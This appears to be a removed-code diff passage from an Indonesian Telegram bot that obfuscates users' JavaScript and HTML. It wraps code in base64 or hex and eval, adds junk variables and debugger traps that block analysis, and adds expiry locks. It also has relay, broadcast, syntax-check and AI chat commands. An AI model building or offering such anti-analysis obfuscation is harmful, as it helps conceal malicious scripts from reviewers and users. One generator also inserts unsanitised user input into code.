-╠ ▢ /invisenc 𝖨𝗇𝗏𝗂𝗌𝖻𝗅𝖾 𝖧𝖺𝗋𝖽
-╠ ▢ /japanenc 𝖩𝖺𝗉𝖺𝗇𝖾𝗌𝖾 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /encarab 𝖠𝗋𝖺𝖻 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /siuenc 𝖲𝗂𝗎 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /japan 𝖩𝖺𝗉𝖺𝗇 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /nebula 𝖭𝖾𝖻𝗎𝗅𝖺 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /var 𝖵𝖺𝗋 𝖲𝗍𝗒𝗅𝖾
-╠ ▢ /invishtml Encrypt Hmtl
-╠════════════════════════════════════╣
-║ Cara Penggunaan
-║ /enccustom 果Prime皮Sabil出Official去
-║ Jangan ada spasi dalam text
-╚═══════ ೋღ ═══  🌸  ═══ ღೋ ═══════╝</pre>
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: EncV2Keyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: EncV2Keyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV2Keyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV2Keyboard });
-        }
-    }
-}
-
-// ==================== CALLBACK ====================
-bot.action('open_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('main_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('enc_menu_v1', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await EncV1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('enc_menu_v2', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await EncV2(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('tools_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu2(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-// ==================== RANDOM ====================
-
-
-// Fixed helper functions
-
-function randomHex(length = 40){
-  return crypto.randomBytes(length).toString("hex")
-}
-
-function randomName(list){
-  const extra=["ツ","々","〆","メ","ん","ฬ","刃","ฬ"]
-  return list[Math.floor(Math.random()*list.length)] +
-    extra[Math.floor(Math.random()*extra.length)] +
-    Math.floor(Math.random()*99999)
-}
-
-function chaosVars(total=500,names=[]){
-  let out=""
-  for(let i=0;i<total;i++){
-    out += `var ${randomName(names)}="${randomHex(80)}";\n`
-  }
-  return out
-}
-
-function makeB64Style(code,names,count=500){
-  const b64 = Buffer.from(code).toString("base64")
-  const funcName = randomName(names)
-  const varName = randomName(names)
-
-  return `(function(){
-${chaosVars(count,names)}
-function ${funcName}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function artilleryStyle(code){
-  return makeB64Style(code,["つき","さくら","ほし","ゆき","ねこ","みず","かぜ","やみ"],600)
-}
-
-function hardcoreStyle(code){
-  const names=["悪魔","闇","無限","崩壊","零","死神","幻","滅"]
-  const b64=Buffer.from(code).toString("base64")
-  const funcName=randomName(names)
-  const varName=randomName(names)
-
-  return `(function(){
-${chaosVars(1000,names)}
-setInterval(()=>{debugger},1)
-console.clear()
-function ${funcName}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function phantomStyle(code){
-  const hex=Buffer.from(code).toString("hex")
-  return `eval(Buffer.from("${hex}","hex").toString())`
-}
-
-function balancedStyle(code){
-  return makeB64Style(code,["均衡","静","風","月"],300)
-}
-
-function reversedStyle(code){
-  const rev=code.split("").reverse().join("")
-  return `eval("${rev}".split("").reverse().join(""))`
-}
-
-function rosemaryStyle(code){
-  return makeB64Style(code,["薔薇","深夜","死","夢"],800)
-}
-
-function invisStyle(code){
-  const uni=escape(Buffer.from(code).toString("base64"))
-  return `eval(Buffer.from(unescape("${uni}"),"base64").toString())`
-}
-
-function japanStyle(code){
-  return makeB64Style(code,["つき","さくら","ほし","ねこ","そら","ゆき","みず","かぜ","れい","やみ","むげん","はな"],1500)
-}
-
-function arabStyle(code){
-  return makeB64Style(code,["سلام","قمر","نور","ليل","شمس","نار","روح","موت"],900)
-}
-
-function siuStyle(code){
-  return makeB64Style(code,["SIUU","RONALDO","GOAL","CR7"],600)
-}
-
-function nebulaStyle(code){
-  return makeB64Style(code,["星雲","宇宙","銀河","闇","ブラック","無限","ゼロ"],2500)
-}
-
-function varStyle(code){
-  return `(function(){${code}})();`
-}
-
-function customStyle(code,name){
-  const names=["改造","極限","混乱","破壊","地獄","暗黒","虚無"]
-  const b64=Buffer.from(code).toString("base64")
-  const funcName = /^[A-Za-z_$][A-Za-z0-9_$]*$/.test(name) ? name : "CustomLoader"
-  const varName=randomName(names)
-
-  return `(function(){
-${chaosVars(1200,names)}
-function ${name}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function timeLockStyle(code,days){
-  const expired=Date.now()+(Number(days)*86400000)
-  const b64=Buffer.from(code).toString("base64")
-
-  return `(function(){
-if(Date.now()>${expired}){
-console.log("Script Expired");
-process.exit();
-}
-eval(Buffer.from("${b64}","base64").toString());
-})();`
-}
-
-
-// COMMAND
-// /artillery
-bot.command(
-'artillery',
-(ctx)=>
-processObfuscate(
-ctx,
-artilleryStyle,
-'Artillery'
-)
-)
-
-// /hardcore
-bot.command(
-'hardcore',
-(ctx)=>
-processObfuscate(
-ctx,
-hardcoreStyle,
-'Hardcore'
-)
-)
-
-// /phantom
-bot.command(
-'phantom',
-(ctx)=>
-processObfuscate(
-ctx,
-phantomStyle,
-'Phantom'
-)
-)
-
-// /balanced
-bot.command(
-'balanced',
-(ctx)=>
-processObfuscate(
-ctx,
-balancedStyle,
-'Balanced'
-)
-)
-
-// /reversed
-bot.command(
-'reversed',
-(ctx)=>
-processObfuscate(
-ctx,
-reversedStyle,
-'Reversed'
-)
-)
-
-// /rosemary
-bot.command(
-'rosemary',
-(ctx)=>
-processObfuscate(
-ctx,
-rosemaryStyle,
-'Rosemary'
-)
-)
-
-// /invisenc
-bot.command(
-'invisenc',
-(ctx)=>
-processObfuscate(
-ctx,
-invisStyle,
-'InvisEnc'
-)
-)
-
-// /japanenc
-bot.command(
-'japanenc',
-(ctx)=>
-processObfuscate(
-ctx,
-japanStyle,
-'japanenc'
-)
-)
-
-// /encarab
-bot.command(
-'encarab',
-(ctx)=>
-processObfuscate(
-ctx,
-arabStyle,
-'encarab'
-)
-)
-
-// /siuenc
-bot.command(
-'siuenc',
-(ctx)=>
-processObfuscate(
-ctx,
-siuStyle,
-'siuenc'
-)
-)
-
-// /japan
-bot.command(
-'japan',
-(ctx)=>
-processObfuscate(
-ctx,
-japanStyle,
-'Japan'
-)
-)
-
-// /nebula
-bot.command(
-'nebula',
-(ctx)=>
-processObfuscate(
-ctx,
-nebulaStyle,
-'Nebula'
-)
-)
-
-// /var
-bot.command(
-'var',
-(ctx)=>
-processObfuscate(
-ctx,
-varStyle,
-'Var'
-)
-)
-
-// /enctime
-bot.command(
-'enctime',
-async(ctx)=>{
-
-const days =
-ctx.message.text
-.split(' ')[1]
-
-if(!days){
-
-return ctx.reply(
-'❌ Example : /enctime 30'
-)
-
-}
-
-await processObfuscate(
-ctx,
-(code)=>timeLockStyle(code, days),
-'EncTime'
-)
-
-}
-)
-
-// /enccustom
-bot.command(
-'enccustom',
-async(ctx)=>{
-
-const text =
-ctx.message.text
-.split(' ')
-.slice(1)
-.join(' ')
-
-if(!text){
-
-return ctx.reply(
-'❌ Example : /enccustom SabilOfficial'
-)
-
-}
-
-await processObfuscate(
-ctx,
-(code)=>customStyle(code, text),
-'EncCustom'
-)
-
-}
-)
-
-// ==================== HARDHTML ====================
-
-bot.command("hardhtml", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file html.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-const html = res.data
-
-const b64 =
-Buffer
-.from(html)
-.toString("base64")
-
-let anti = ""
-
-for(let i=0;i<800;i++){
-
-anti += `
-var _${randomHex(8)}="${randomHex(50)}";
-`
-
-}
-
-const result = `
-<script>
-${anti}
-setInterval(()=>{
-debugger
-},1)
-eval(
-atob(
-"${b64}"
-)
-)
-</script>
-`
-
-await ctx.replyWithDocument({
-source: Buffer.from(result),
-filename: "hardhtml.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== INVISHTML ====================
-
-bot.command("invishtml", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file html.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-const html = res.data
-
-const uni =
-escape(
-Buffer
-.from(html)
-.toString("base64")
-)
-
-const result = `
-<script>
-eval(
-atob(
-unescape(
-"${uni}"
-)
-)
-)
-</script>
-`
-
-await ctx.replyWithDocument({
-source: Buffer.from(result),
-filename: "invishtml.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== GETSOURCE ====================
-
-bot.command("getsource", async (ctx) => {
-
-try {
-
-const url =
-ctx.message.text
-.split(" ")
-.slice(1)
-.join(" ")
-
-if(!url){
-return ctx.reply(
-"Example:\n/getsource https://example.com"
-)
-}
-
-const res =
-await axios.get(url)
-
-const html = res.data
-
-await ctx.replyWithDocument({
-source: Buffer.from(html),
-filename: "source.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-bot.command("cekcode", async (ctx) => {
-try {
-
-if (!ctx.message.reply_to_message)
-return ctx.reply("Reply function JavaScript yang ingin dicek.")
-
-const text =
-ctx.message.reply_to_message.text ||
-ctx.message.reply_to_message.caption
-
-if (!text)
-return ctx.reply("Pesan yang direply tidak berisi kode.")
-
-let acorn
-try {
-acorn = require("acorn")
-} catch {
-return ctx.reply("Module acorn belum terinstall.\nInstall dengan: npm install acorn")
-}
-
-try {
-
-acorn.parse(text, {
-ecmaVersion: "latest",
-sourceType: "module",
-locations: true
-})
-
-return ctx.reply(`🔎 Mengecek Code.....
-
-Asekk Ga ada Error Cuy Di Code Nya.`)
-
-} catch (err) {
-
-const lines = text.split("\n")
-const line = err.loc.line
-const column = err.loc.column
-
-const start = Math.max(0, line - 3)
-const end = Math.min(lines.length, line + 2)
-
-const snippet = lines.slice(start, end).map((l, i) => {
-const num = start + i + 1
-return num === line
-? `👉 ${num} | ${l}`
-: `   ${num} | ${l}`
-}).join("\n")
-
-return ctx.reply(`Yahhh Code Nya Error Ni Fixed Dong
-
-${err.message}
-Line ${line}:${column}
-
-📌 Cuplikan:
-${snippet}`)
-
-}
-
-} catch (e) {
-console.error(e)
-ctx.reply("Terjadi error saat mengecek code.")
-}
-
-});
-
-// ==================== INFOERROR ====================
-
-bot.command("infoerror", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file js.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-let code = res.data
-
-let info = []
-
-if(code.includes("eval(eval(")){
-info.push("Nested eval detected")
-}
-
-if(code.includes("debugger")){
-info.push("Debugger detected")
-}
-
-if(code.includes("while(true)")){
-info.push("Infinite loop detected")
-}
-
-if(code.length > 500000){
-info.push("File too large")
-}
-
-if(info.length < 1){
-info.push("No problem detected")
-}
-
-ctx.reply(
-`INFO ERROR:\n\n- ${info.join("\n- ")}`
-)
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== FIXFUNC ====================
-
-bot.command("fixfunc", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file js.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-let code = res.data
-
-code = code
-.replace(/debugger;/g,"")
-.replace(/while\s*\(\s*true\s*\)/g,"while(false)")
-.replace(/eval\(eval\(/g,"eval(")
-
-await ctx.replyWithDocument({
-source: Buffer.from(code),
-filename: "fixed.js"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// =============================
-// CMD BACKUP
-// =============================
-bot.command("backup", async (ctx) => {
-
-        const userId =
-            Number(ctx.from.id)
-
-        // owner only
-        if (userId !== config.OWNER_ID) {
-
-            return ctx.reply(
-                "❌ Owner only."
-            )
-        }
-
-        await ctx.reply(
-            "📦 Membuat backup..."
-        )
-
-        await sendBackup(
-            "Manual Backup"
-        )
-
-        await ctx.reply(
-            "✅ Backup berhasil dikirim ke owner."
-        )
-})
-
-// =============================
-// CMD CHATADMIN
-// =============================
-bot.command("chatowner", async (ctx) => {
-
-    const userId = Number(ctx.from.id)
-    const OWNER_ID = Number(config.OWNER_ID)
-
-    if (userId === OWNER_ID) {
-        return ctx.reply(
-            "Command ini hanya untuk user."
-        )
-    }
-
-    CHAT_SESSION[userId] = true
-
-    const kb = {
-        inline_keyboard: [[
-            {
-                text: "❌ Batalkan",
-                callback_data: "cancel_chat_admin"
-            }
-        ]]
-    }
-
-    await ctx.reply(
-`
-<blockquote><b>💬 CHAT OWNER</b></blockquote>
-<blockquote>
-Silahkan kirim pesan anda untuk owner.
-Pesan akan langsung diteruskan ke owner.
-</blockquote>
-`,
-        {
-            parse_mode: "HTML",
-            reply_markup: kb
-        }
-    )
-
-})
-
-bot.action("cancel_chat_admin", async (ctx) => {
-
-    const userId = Number(ctx.from.id)
-
-    delete CHAT_SESSION[userId]
-
-    await ctx.editMessageText(
-`
-<blockquote><b>❌ Chat Owner Dibatalkan</b></blockquote>
-`,
-        {
-            parse_mode: "HTML"
-        }
-    )
-
-    await ctx.answerCbQuery(
-        "Chat dibatalkan."
-    )
-
-})
-
-bot.on("text", async (ctx, next) => {
-
-    const userId = Number(ctx.from.id)
-    const OWNER_ID = Number(config.OWNER_ID)
-
-    if (userId === OWNER_ID)
-        return next()
-
-    if (!CHAT_SESSION[userId])
-        return next()
-
-    if (ctx.message.text.startsWith("/"))
-        return next()
-
-    const waktu = new Date()
-        .toLocaleString("id-ID")
-
-    console.log(
-        "[CHATOWNER]",
-        userId,
-        ctx.message.text
-    )
-
-    const sent =
-        await bot.telegram.sendMessage(
-            OWNER_ID,
-`
-<blockquote><b>📩 PESAN USER</b></blockquote>
-<blockquote>
-👤 Username : @${ctx.from.username || "Tidak ada"}
-🆔 ID : <code>${userId}</code>
-🕒 Waktu : ${waktu}
-📝 Pesan :
-${ctx.message.text}</blockquote>
-<blockquote><b>Reply pesan ini untuk membalas user.</b></blockquote>
-`,
-            {
-                parse_mode: "HTML"
-            }
-        ).catch(err => {
-
-            console.log(
-                "[SEND OWNER ERROR]",
-                err
-            )
-
-            return null
-
-        })
-
-    if (!sent) {
-
-        return ctx.reply(
-            "❌ Gagal mengirim pesan ke owner."
-        )
-
-    }
-
-    REPLY_MAP[
-        sent.message_id
-    ] = userId
-
-    await ctx.reply(
-`
-<blockquote><b>✅ Pesan Berhasil Dikirim</b></blockquote>
-<blockquote>Tunggu hingga owner membalas pesan anda.</blockquote>
-`,
-        {
-            parse_mode: "HTML"
-        }
-    )
-
-})
-
-bot.on("text", async (ctx, next) => {
-
-    const ownerId =
-        Number(ctx.from.id)
-
-    const OWNER_ID =
-        Number(config.OWNER_ID)
-
-    if (ownerId !== OWNER_ID)
-        return next()
-
-    const reply =
-        ctx.message.reply_to_message
-
-    if (!reply)
-        return next()
-
-    if (ctx.message.text.startsWith("/"))
-        return next()
-
-    const targetUser =
-        REPLY_MAP[
-            reply.message_id
-        ]
-
-    if (!targetUser)
-        return next()
-
-    await bot.telegram.sendMessage(
-        targetUser,
-`
-<blockquote><b>💬 BALASAN OWNER</b></blockquote>
-<blockquote>${ctx.message.text}</blockquote>
-`,
-        {
-            parse_mode: "HTML"
-        }
-    ).catch(err => {
-
-        console.log(
-            "[REPLY USER ERROR]",
-            err
-        )
-
-    })
-
-    await ctx.reply(
-        "✅ Balasan berhasil dikirim."
-    )
-
-})
-
-bot.command("broadcast", async (ctx) => {
-
-    if (ctx.from.id !== config.OWNER_ID) {
-        return ctx.reply(
-            "❌ Khusus Owner"
-        )
-    }
-
-    if (!ctx.message.reply_to_message) {
-        return ctx.reply(
-            "Reply pesan dengan command /broadcast"
-        )
-    }
-
-    if (!fs.existsSync(ACCESS_FILE)) {
-        return ctx.reply(
-            "❌ Database user tidak ditemukan."
-        )
-    }
-
-    const db = JSON.parse(
-        fs.readFileSync(
-            ACCESS_FILE,
-            "utf8"
-        )
-    )
-
-    const users = Object.keys(
-        db.users || {}
-    )
-    .map(id => Number(id))
-    .filter(
-        id =>
-        id !== config.OWNER_ID
-    )
-
-    if (!users.length) {
-        return ctx.reply(
-            "❌ Tidak ada user terdaftar."
-        )
-    }
-
-    const replyMsg =
-        ctx.message.reply_to_message
-
-    const waitMsg =
-        await ctx.reply(
-`<pre>▱▱▱▱▱▱▱▱▱▱▱ 0%</pre>
-Memulai Broadcast...`,
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    const steps = [
-        {
-            percent: 10,
-            text: "⚙️ Mengambil Database User",
-            delay: 500
-        },
-        {
-            percent: 40,
-            text: "⚙️ Menyiapkan Broadcast",
-            delay: 700
-        },
-        {
-            percent: 50,
-            text: "⚙️ Memvalidasi User Aktif",
-            delay: 600
-        },
-        {
-            percent: 70,
-            text: "⚙️ Mengirim Broadcast",
-            delay: 800
-        },
-        {
-            percent: 90,
-            text: "⚙️ Menyelesaikan Broadcast",
-            delay: 600
-        },
-        {
-            percent: 100,
-            text: "✅ Broadcast Siap Dikirim",
-            delay: 500
-        }
-    ]
-
-    for (const step of steps) {
-
-        const barLength = 11
-
-        const filled =
-            Math.round(
-                (
-                    step.percent /
-                    100
-                ) *
-                barLength
-            )
-
-        const bar =
-            "▰".repeat(
-                filled
-            ) +
-            "▱".repeat(
-                barLength -
-                filled
-            )
-
-        await ctx.telegram
-        .editMessageText(
-            waitMsg.chat.id,
-            waitMsg.message_id,
-            undefined,
-`<pre>${bar} ${step.percent}%
-${step.text}</pre>
-⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡... ⋙
-`,
-            {
-                parse_mode:
-                "HTML"
-            }
-        )
-        .catch(() => {})
-
-        await pause(
-            step.delay
-        )
-
-    }
-
-    let success = 0
-    let failed = 0
-
-    for (const userId of users) {
-
-        try {
-
-            await ctx.telegram
-            .copyMessage(
-                userId,
-                ctx.chat.id,
-                replyMsg.message_id
-            )
-
-            success++
-
-        } catch (err) {
-
-            console.log(
-                `Broadcast gagal ke ${userId}`,
-                err.message
-            )
-
-            failed++
-
-        }
-
-        await pause(100)
-
-    }
-
-    await ctx.telegram
-    .deleteMessage(
-        ctx.chat.id,
-        waitMsg.message_id
-    )
-    .catch(() => {})
-
-    await ctx.reply(
-`<blockquote>📢 <b>BROADCAST SELESAI</b></blockquote>
-<blockquote>
-✅ Berhasil : ${success}
-❌ Gagal : ${failed}
-👥 Total : ${users.length}</blockquote>
-<blockquote>Broadcast berhasil dikirim ke seluruh user aktif.</blockquote>`,
-        {
-            parse_mode:
-            "HTML"
-        }
-    )
-
-})
-
-// =============================
-// MAINTENANCE COMMAND
-// =============================
-bot.command("maintenance", async (ctx) => {
-
-    const userId = Number(ctx.from.id)
-
-    // owner only
-    if (userId !== config.OWNER_ID) {
-        return ctx.reply("❌ Khusus owner.")
-    }
-
-    const text = ctx.message.text
-
-    // ambil args
-    const args = text.split(" ").slice(1).join(" ")
-
-    // kalau kosong
-    if (!args) {
-        return ctx.reply(`\`\`\`js
-📌 Maintenance Mode
-
-/maintenance on|update system
-/maintenance off|maintenance selesai\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // split on/off dan alasan
-    const [mode, ...reasonArray] = args.split("|")
-
-    const input = mode.trim().toLowerCase()
-
-    const reason = reasonArray.join("|").trim() || "Tidak ada alasan"
-
-    // =============================
-    // ON
-    // =============================
-    if (input === "on") {
-
-        fs.writeFileSync(
-            PATH_MAINTENANCE,
-            JSON.stringify({
-                status: true,
-                reason
-            }, null, 2)
-        )
-
-        return ctx.reply(
-            `\`\`\`js
-🛠 Maintenance Enabled
-
-📌 Status : ON
-📝 Alasan : ${reason}\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // =============================
-    // OFF
-    // =============================
-    if (input === "off") {
-
-        fs.writeFileSync(
-            PATH_MAINTENANCE,
-            JSON.stringify({
-                status: false,
-                reason
-            }, null, 2)
-        )
-
-        return ctx.reply(
-            `\`\`\`js
-✅ Maintenance Disabled
-
-📌 Status : OFF
-📝 Keterangan : ${reason}\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // invalid
-    return ctx.reply(
-        `\`\`\`js
-✘ Format Salah
-
-/maintenance on|alasan
-/maintenance off|alasan\`\`\`
-        `,
-        {
-            parse_mode: "Markdown"
-        }
-    )
-})
-// ==================== COMMAND /CLAUDE ====================
-bot.command('ai', async (ctx) => {
-
-    const chatId = ctx.chat.id;
-    const ownerId = config.OWNER_ID;
-    const sessionFp = path.join(__dirname, './database/ai.json');
-
-    // Cek maintenance (jika fungsi isMaintenance ada)
-    if (typeof isMaintenance === 'function' && isMaintenance() && chatId !== ownerId) {
-        return ctx.reply('🛠 Bot sedang maintenance.');
-    }
-
-    // Ambil teks setelah /claude
-    const q = ctx.message.text.replace(/^\/ai\s*/, '').trim();
-    if (!q) {
-        return ctx.reply('Ketik /ai sambil isi pesan yang ingin di tanyakan');
-    }
-
-    // Kirim pesan "sedang memproses..."
-    const waitMsg = await ctx.reply('Waiting...');
-
-    // Fungsi load/save session
-    const loadAI = () => {
-        try {
-            if (!fs.existsSync(sessionFp)) {
-                fs.writeJsonSync(sessionFp, {});
-                return {};
-            }
-            return fs.readJsonSync(sessionFp);
-        } catch (e) {
-            console.error('[AI-SESS-ERR]', e.message);
-            return {};
-        }
-    };
-    const saveAI = (data) => {
-        try {
-            fs.writeJsonSync(sessionFp, data, { spaces: 2 });
-        } catch (e) {
-            console.error('[AI-SAVE-ERR]', e.message);
-        }
-    };
-    const getSession = (uid, db) => {
-        if (!db[uid]) db[uid] = [];
-        return db[uid];
-    };
-
-    try {
-        const uid = ctx.from.id.toString();
-        const aiDb = loadAI();
-        const sess = getSession(uid, aiDb);
-
-        sess.push({ role: 'user', content: q });
-        if (sess.length > 20) aiDb[uid] = sess.slice(-10);
-
-        const systemPrompt = `
-Aturan format jawaban:
-- Gunakan Markdown Telegram sederhana (bold, bullet).
-- Dilarang menggunakan tabel.
-- Jika penjelasan biasa, pakai teks dan bullet saja.
-- Jika ada kode, gunakan blok kode (\`\`\`) sesuai bahasa.
-- Jangan gunakan emoji berlebihan.
-- Langsung to the point, jangan ulang pertanyaan user.
-- Pastikan output aman untuk Telegram tanpa error parse.
-Session Memory:
-- Lihat history chat terakhir (max 10 pesan).
-- Lanjutkan konteks percakapan sebelumnya.
-- Ingat detail yang sudah disebutkan user.`.trim();
-
-        const chatHistory = [
-            { role: 'system', content: systemPrompt },
-            ...sess.slice(-10),
-        ];
-
-        const { data } = await axios.post(
-            'https://aliicia.my.id/api/chatgpt',
-            { message: chatHistory },
-            { headers: { 'Content-Type': 'application/json' } }
-        );
-
-        let ans = (data?.response || 'Gagal mendapatkan jawaban.')
-            .replace(/\u0000/g, '').replace(/\r\n/g, '\n').replace(/\r/g, '\n').trim();
-
-        sess.push({ role: 'assistant', content: ans });
-        saveAI(aiDb);
-
-        // Fungsi split untuk memotong pesan > 4000 karakter (batas aman Telegram 4096)
-        const splitResponse = (text, maxLen = 4000) => {
-            const parts = [];
-            const codeRx = /```[\s\S]*?```/g;
-            const segs = [];
-            let lastIdx = 0, m;
-
-            while ((m = codeRx.exec(text)) !== null) {
-                if (m.index > lastIdx) segs.push({ t: 'text', v: text.substring(lastIdx, m.index) });
-                segs.push({ t: 'code', v: m[0] });
-                lastIdx = m.index + m[0].length;
-            }
-            if (lastIdx < text.length) segs.push({ t: 'text', v: text.substring(lastIdx) });
-
-            let cur = '';
-            for (const seg of segs) {
-                if ((cur.length + seg.v.length) <= maxLen) {
-                    cur += seg.v;
-                } else {
-                    if (cur.trim()) parts.push(cur.trim());
-                    if (seg.t === 'code' && seg.v.length > maxLen) {
-                        const inner = seg.v.substring(3, seg.v.length - 3);
-                        const lang = (seg.v.match(/^```(\w+)/) || ['', ''])[1];
-                        const lines = inner.split('\n');
-                        let chunk = `\`\`\`${lang}\n`;
-                        for (const ln of lines) {
-                            if ((chunk.length + ln.length + 1) > maxLen - 3) {
-                                chunk += '```';
-                                parts.push(chunk);
-                                chunk = `\`\`\`${lang}\n${ln}\n`;
-                            } else {
-                                chunk += ln + '\n';
-                            }
-                        }
-                        if (chunk.trim() !== `\`\`\`${lang}`) {
-                            chunk += '```';
-                            cur = chunk;
-                        } else {
-                            cur = '';
-                        }
-                    } else {
-                        cur = seg.v;
-                    }
-                }
-            }
-            if (cur.trim()) parts.push(cur.trim());
-            return parts;
-        };
-
-        const chunks = splitResponse(ans, 4000);
-        // Hapus pesan "sedang memproses..."
-        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
-        // Kirim setiap bagian
-        for (const chunk of chunks) {
-            await ctx.reply(chunk, { parse_mode: 'Markdown' });
-        }
-    } catch (err) {
-        console.error('[AI-ERR]', err.message);
-        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
-        ctx.reply('❌ Terjadi error: ' + err.message);
-    }
-});
-
-bot.command("cekerror", async (ctx) => {
-
-    const rep = ctx.message.reply_to_message
-
-    let code = ""
-    let fileName = "code"
-
-    if (rep?.document) {
-
-        const ext = path
-            .extname(rep.document.file_name)
-            .toLowerCase()
-
-        const allowed = [
-            ".js",
-            ".json",
-            ".html",
-            ".py"
-        ]
-
-        if (!allowed.includes(ext)) {
-
-            return ctx.reply(
-                "❌ Format yang didukung:\n.js\n.json\n.html\n.py"
-            )
-
-        }
-
-        fileName =
-            rep.document.file_name
-
-        try {
-
-            code =
-                await downloadTgFile(
-                    ctx.telegram,
-                    rep.document.file_id
-                )
-
-        } catch (e) {
-
-            return ctx.reply(
-                `❌ Gagal download file:\n${e.message}`
-            )
-
-        }
-
-    } else if (rep?.text) {
-
-        code =
-            rep.text.trim()
-
-    } else {
-
-        return ctx.reply(
-`
-<b>Cara Pakai</b>
-
-Reply kode atau file:
-
-• .js
-• .json
-• .html
-• .py
-
-Lalu ketik:
-
-<code>/cekerror</code>
-`,
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    }
-
-    if (!code.trim()) {
-
-        return ctx.reply(
-            "❌ Kode kosong."
-        )
-
-    }
-
-    const waitMsg =
-        await ctx.reply(
-            "🔍 Menganalisis Error..."
-        )
-
-    try {
-
-        const {
-            errorMsg,
-            errorLine,
-            fixSuggest,
-            annotated,
-            hasError
-        } = analyseCode(code)
-
-        await ctx.telegram
-            .deleteMessage(
-                waitMsg.chat.id,
-                waitMsg.message_id
-            )
-            .catch(() => {})
-
-        if (!hasError) {
-
-            return ctx.reply(
-`
-✅ Tidak ditemukan error.
-📄 File : <code>${fileName}</code>
-`,
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        }
-
-        const result =
-`
-HASIL ANALISIS ERROR
-────────────────────────────
-
-File : ${fileName}
-Ukuran : ${Buffer.byteLength(code)}
-Baris Error :
-${errorLine || "-"},
-
-Jenis Error :
-${errorMsg}
-
-────────────────────────────
-
-Saran Perbaikan :
-${fixSuggest}
-
-────────────────────────────
-
-Cuplikan Error :
-${annotated}
-
-────────────────────────────
-Analisis File/Code Selesai
-`
-
-        if (result.length <= 3500) {
-
-            return ctx.reply(
-                `\`\`\`js
-                ${esc(result)}\`\`\``,
-                {
-                    parse_mode: "Markdown"
-                }
-            )
-
-        }
-
-        const txtFile =
-            path.join(
-                __dirname,
-                `analisis-error-${Date.now()}.txt`
-            )
-
-        fs.writeFileSync(
-            txtFile,
-            result
-        )
-
-        await ctx.replyWithDocument(
-            {
-                source: txtFile,
-                filename: "analisis-error.js"
-            },
-            {
-                caption:
-                    "📄 Analisis terlalu panjang dikirim via file.js"
-            }
-        )
-
-        fs.unlinkSync(txtFile)
-
-    } catch (err) {
-
-        await ctx.telegram
-            .deleteMessage(
-                waitMsg.chat.id,
-                waitMsg.message_id
-            )
